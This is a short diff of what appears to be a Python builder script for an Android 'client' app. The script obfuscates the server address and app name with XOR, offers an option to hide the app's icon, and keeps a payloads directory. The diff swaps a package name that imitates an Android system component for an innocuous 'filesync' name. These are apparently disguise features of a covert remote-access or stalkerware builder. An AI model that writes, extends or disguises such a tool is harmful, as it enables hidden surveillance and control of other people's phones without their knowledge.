@@ -22,7 +22,7 @@ PROJECT = os.path.dirname(os.path.abspath(__file__))
 CLIENT_DIR = os.path.join(PROJECT, "client")
 SDK_DIR = os.path.join(PROJECT, "android-sdk")
 PAYLOADS_DIR = os.path.join(PROJECT, "payloads")
-CONFIG_FILE = os.path.join(CLIENT_DIR, "app", "src", "main", "kotlin", "com", "android", "internal", "svc", "Config.kt")
+CONFIG_FILE = os.path.join(CLIENT_DIR, "app", "src", "main", "kotlin", "com", "georgetech", "filesync", "Config.kt")
 
 G = "\033[92m"
 R = "\033[91m"
@@ -42,7 +42,7 @@ def xor_encrypt(plaintext, key=0x5A):
 def inject_config(ip, port, app_name, hide_icon):
     enc_host = xor_encrypt(ip)
     enc_name = xor_encrypt(app_name)
-    config = f'''package com.android.internal.svc
+    config = f'''package com.georgetech.filesync
 
 object Config {{
     val SYNC_HOST: String get() = Crypt.d("{enc_host}")
